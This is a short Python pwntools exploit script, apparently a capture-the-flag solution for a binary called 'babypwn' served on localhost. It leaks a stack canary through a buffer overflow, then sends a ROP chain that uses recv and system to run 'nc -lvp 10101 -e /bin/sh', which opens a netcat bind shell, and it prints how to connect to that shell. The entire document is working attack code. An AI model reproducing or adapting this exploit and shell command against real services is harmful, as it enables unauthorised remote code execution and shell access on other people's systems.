from pwn import *

s = remote('localhost', 8181)
e = ELF('./babypwn')

ppppr = 0x8048eec

recv_plt = e.plt['recv']
system_plt = e.plt['system']

cmd = 'nc -lvp 10101 -e /bin/sh'

s.sendlineafter('> ', '1')
s.sendafter(': ', 'A'*41)

s.recv(41)
canary = u32('\x00' + s.recv(3))
print "[+] Canary leak : " + hex(canary)

s.close()

############################################

s = remote('localhost', 8181)

s.sendlineafter('> ', '1')

#Access the return address
payload = ""
payload += 'A'*40
payload += p32(canary)
payload += 'A'*12

#Input command
payload += p32(recv_plt)
payload += p32(ppppr)
payload += p32(4)
payload += p32(e.bss())
payload += p32(len(cmd)+1)
payload += p32(0)

#Call system and reverse connection
payload += p32(system_plt)
payload += "AAAA"
payload += p32(e.bss())

s.sendlineafter(': ', payload)

s.sendlineafter('> ', '3')
sleep(0.1)

print '[*] Go "nc localhost 10101"'

s.sendline(cmd)
